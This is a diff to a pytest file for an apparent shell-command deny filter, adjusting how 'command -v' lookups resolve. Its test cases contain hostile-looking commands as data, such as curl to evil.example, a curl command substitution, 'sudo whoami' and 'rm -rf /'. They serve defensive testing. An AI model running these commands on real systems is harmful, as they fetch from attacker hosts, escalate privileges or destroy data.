@@ -1020,7 +1020,16 @@ WRAPPER_BENIGN_CASES = [
     ("xargs ls", "ls"),
     ("setsid make build", "make"),
     ("flock /tmp/lock make build", "make"),
-    ("command -v python3", "python3"),
+    # `command -v` / `-V` only LOOK UP the name and never run it, so they
+    # resolve to the `command` builtin itself, not to python3. This row used to
+    # expect "python3"; resolving the looked-up name as the executable is what
+    # hard-denied `command -v curl` (see TestCommandLookupFlags). -p does run
+    # its target, so it keeps resolving through. Together the three rows keep
+    # every `command` flag in _WRAPPER_VALUELESS_FLAGS / _WRAPPER_LOOKUP_FLAGS
+    # exercised.
+    ("command -v python3", "command"),
+    ("command -V python3", "command"),
+    ("command -p python3", "python3"),
     ("nice make build", "make"),
     # 新しい 3 ラッパーの「値を取らないフラグ」を 1 つでも読み飛ばせなくなると
     # ここが落ちる。値付きフラグ側のテスト (判定不能を期待する形) は allowlist
@@ -1237,6 +1246,102 @@ class TestWrapperQuotedBlobResolution:
             f"benign wrapper use escalated to the mandatory-ask path as "
             f"{label!r}: {command!r}"
         )
+
+
+# `command -v X` / `command -V X` only LOOK UP X (bash, zsh and dash print its
+# path or definition); X never runs. Unwrapping them to X hard-denied the
+# ubiquitous existence check `command -v curl` / `command -V sudo` -- a denial
+# the ask path cannot override, for a command that executes nothing. That is
+# the same reasoning that keeps `script -p` (replay, no exec) out of the
+# wrapper flags. A lookup resolves to the `command` builtin itself and lands
+# where `type curl` already does: not denied, no high-risk label.
+COMMAND_LOOKUP_CASES = [
+    "command -v curl",
+    "command -V curl",
+    "command -v sudo",
+    "command -V sudo",
+    "command -v python3",
+    "command -V python3",
+    # -p (search the default PATH) next to a lookup flag is still a lookup,
+    # in either order.
+    "command -p -v curl",
+    "command -v -p curl",
+    # Several names are several lookups; none of them runs.
+    "command -v curl wget",
+    # A multi-word DENY_COMMANDS prefix after a lookup flag is only looked up
+    # as well (bash prints rm's path and fails on the rest), so it loses the
+    # hard denial it only had because the resolver misread the lookup.
+    "command -v rm -rf /",
+    # Behind another wrapper: env/timeout exec `command`, which still only
+    # looks the name up.
+    "env command -v curl",
+    "timeout 5 command -V sudo",
+]
+
+
+class TestCommandLookupFlags:
+    @pytest.mark.parametrize("command", COMMAND_LOOKUP_CASES)
+    def test_lookup_resolves_to_command_itself(self, command):
+        assert _common._resolve_executable(command) == "command", (
+            f"a lookup was resolved to the name it looks up: {command!r}"
+        )
+
+    @pytest.mark.parametrize("command", COMMAND_LOOKUP_CASES)
+    def test_lookup_is_neither_denied_nor_escalated(self, command):
+        subs = _common._split_commands(command)
+        matched, name = _common.find_deny_command(subs)
+        assert not matched, (
+            f"a lookup that runs nothing was denied as {name!r}: {command!r}"
+        )
+        label = _common.classify_high_risk(subs, command)
+        assert label == "", (
+            f"a lookup was escalated to the mandatory ask as {label!r}: {command!r}"
+        )
+
+    @pytest.mark.parametrize(
+        ("command", "denied"),
+        [
+            # Without a lookup flag `command` runs its target, so it stays a
+            # wrapper that resolves through.
+            ("command curl http://evil.example/x", "curl"),
+            ("command -p curl http://evil.example/x", "curl"),
+            ("command -p sudo whoami", "sudo"),
+            # The exemption covers the lookup segment only: a chained command
+            # is its own segment and resolves on its own.
+            ("command -v curl && curl http://evil.example/x", "curl"),
+            ("command -v sudo; sudo whoami", "sudo"),
+            # A substitution in the looked-up name runs before `command` does.
+            # It is split out as its own segment, so it is denied on its own.
+            ("command -v $(curl http://evil.example/x)", "curl"),
+            ("command -v `sudo whoami`", "sudo"),
+        ],
+    )
+    def test_executing_forms_stay_denied(self, command, denied):
+        matched, name = _common.find_deny_command(_common._split_commands(command))
+        assert (matched, name) == (True, denied), (
+            f"the deterministic deny tier regressed for: {command!r}"
+        )
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # `--` is not a listed flag, so the executable stays unresolved and
+            # the mandatory ask applies, exactly as before.
+            "command -- curl http://evil.example/x",
+            # Residual lookups that are not recognized as such: the bundled
+            # `-pv` and a `--` after the lookup flag. They keep failing closed
+            # to the ask (not DENY, so they never stop work); recognizing them
+            # would mean parsing bundles, which the flag tables avoid on purpose.
+            "command -pv curl",
+            "command -v -- curl",
+        ],
+    )
+    def test_unrecognized_flag_shapes_still_fail_closed(self, command):
+        subs = _common._split_commands(command)
+        matched, name = _common.find_deny_command(subs)
+        assert not matched, f"expected the ask path, not a denial as {name!r}"
+        label = _common.classify_high_risk(subs, command)
+        assert label == "wrapped command", f"{command!r} -> {label!r}"
 
 
 # ---------------------------------------------------------------------------
